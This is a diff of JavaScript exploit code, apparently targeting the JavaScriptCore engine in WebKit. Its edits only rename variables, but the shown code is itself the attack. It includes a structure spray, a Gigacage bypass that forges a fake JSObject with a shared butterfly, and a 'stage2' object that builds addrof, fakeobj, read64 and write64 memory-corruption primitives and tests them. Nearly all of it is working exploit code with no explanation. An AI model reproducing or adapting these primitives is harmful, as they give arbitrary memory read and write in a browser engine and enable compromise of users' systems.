@@ -584,7 +584,7 @@ function unbox_double(d) {
     u8[6] -= 1;
     return f64[0];
 }
-	    var victim = structure_spray[510];
+	    var victim1 = structure_spray[510];
 
     // Gigacage bypass: Forge a JSObject which has its butterfly pointing
     // to victim
@@ -599,48 +599,48 @@ function unbox_double(d) {
     for (var i = 0; i < 1000; ++i) {
         array_spray[i] = [13.37+i, 13.37];
     }
-    var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
-    unboxed[0] = 4.2; // no CopyOnWrite
+    var unboxed1 = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
+    unboxed1[0] = 4.2; // no CopyOnWrite
 
-    var boxed = [{}];
-    print(`unboxed @ ${hex(addrof(unboxed))}`);
-    print(`boxed @ ${hex(addrof(boxed))}`);
+    var boxed1 = [{}];
+    print(`unboxed @ ${hex(addrof(unboxed1))}`);
+    print(`boxed @ ${hex(addrof(boxed1))}`);
 
     var outer = {
         header: flags_contiguous, // cell
-        butterfly: victim, // butterfly
+        butterfly: victim1, // butterfly
     };
     print(`outer @ ${hex(addrof(outer))}`);
 
     var hax = fakeobj(addrof(outer) + 0x10);
 
-    hax[1] = unboxed;
-    var shared_butterfly = f2i(victim[1]);
+    hax[1] = unboxed1;
+    var shared_butterfly = f2i(victim1[1]);
     print(`shared butterfly @ ${hex(shared_butterfly)}`);
-    hax[1] = boxed;
-    victim[1] = i2f(shared_butterfly);
+    hax[1] = boxed1;
+    victim1[1] = i2f(shared_butterfly);
 
     outer.header = flags_double;
 
     var stage2 = {
         addrof: function(victim) {
-            boxed[0] = victim;
-            return f2i(unboxed[0]);
+            boxed1[0] = victim;
+            return f2i(unboxed1[0]);
         },
 
         fakeobj: function(addr) {
-            unboxed[0] = i2f(addr);
-            return boxed[0];
+            unboxed1[0] = i2f(addr);
+            return boxed1[0];
         },
 
         write64: function(where, what) {
             hax[1] = i2f(where + 0x10);
-            victim.prop = this.fakeobj(what);
+            victim1.prop = this.fakeobj(what);
         },
 
         read64: function(where) {
             hax[1] = i2f(where + 0x10);
-            return this.addrof(victim.prop);
+            return this.addrof(victim1.prop);
         },
 
         test: function() {
@@ -652,7 +652,7 @@ function unbox_double(d) {
 
             var val = 0x42424242;
             this.write64(shared_butterfly + 8, 0x42424242);
-            if (i2f(val) != unboxed[1]) {
+            if (i2f(val) != unboxed1[1]) {
                 print('stage2 write does not work');
             }
 
@@ -665,9 +665,9 @@ function unbox_double(d) {
             outer = null;
             hax = null;
             for (var i = 0; i < unboxed_size; ++i)
-                boxed[i] = null;
-            boxed = null
-            unboxed = null
+                boxed1[i] = null;
+            boxed1 = null
+            unboxed1 = null
         },
     };
 
